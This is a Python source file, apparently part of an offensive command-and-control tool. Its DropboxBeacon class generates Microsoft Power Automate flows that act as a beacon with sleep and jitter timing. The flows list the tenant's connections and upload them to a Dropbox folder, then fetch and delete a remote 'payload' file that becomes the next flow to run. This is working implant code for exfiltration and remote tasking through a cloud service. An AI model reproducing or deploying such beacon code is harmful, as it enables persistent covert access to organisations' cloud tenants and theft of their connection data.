from pypowerautomate.flow import *
from pypowerautomate.triggers import *
from pypowerautomate.actions import *
from pypowerautomate.connections import Connections
from .base import BaseBeacon


class DropboxBeacon(BaseBeacon):
    def __init__(self, flowmanagement_id: str, client_id: str,dropbox_connector: str, is_encoded: bool = False,
                 key: str = None, key_length: int = 16, is_init: bool = False, sleep_time:int = 60, jitter: int = 10, has_approval:bool = True, email:str = None) -> None:
        self.dropbox_connector: str = dropbox_connector
        super().__init__(flowmanagement_id, client_id, is_encoded, key, key_length,is_init, sleep_time,jitter,has_approval, email)

    def update_connections(self):
        """
        必要なConnection情報を設定する
        """
        connections = Connections()
        count = 0
        if self.connections_data:
            count = connections.set_connections_from_dict(self.connections_data)
        if count < 2:
            # Flow Management Connectorを設定する
            connections.add_connection(self.flowmanagement_id, "/providers/Microsoft.PowerApps/apis/shared_flowmanagement")
            connections.add_connection(self.dropbox_connector, "/providers/Microsoft.PowerApps/apis/shared_dropbox")
        self.connections = connections

    def upload_connections_actions(self) -> Actions:
        """
        Connection情報をDropboxへアップロードする
        """
        upload_actions = Actions()
        upload_actions += ListConnectionsAction("ListConnection")

        dropbox_upload = DropboxUpdateFileAction("UploadConnections", f"pac2/{self.client_id}/upload/connections.json", "@body('ListConnection')")
        upload_actions += dropbox_upload

        return upload_actions

    def download_payload_actions(self) -> Actions:
        """
        Flow内の"payload"という変数に次のフローとなるjsonを設定するアクションを作成する
        """
        download_actions = Actions()
        download_actions.append(AddToTimeAction("AddToTime_01", "Minute", 1))
        dropbox_getpayload = DropboxGetFileContentAction("GetPayload", f"pac2/{self.client_id}/payload")
        dropbox_deletepayload = DropboxDeleteFileAction("DeletePayload",f"pac2/{self.client_id}/payload")
        download_actions.append(dropbox_getpayload)
        download_actions.append(dropbox_deletepayload)
        download_actions.append(SetVariableAction("SetPayload", "payload", "@{body('GetPayload')}"))
        return download_actions
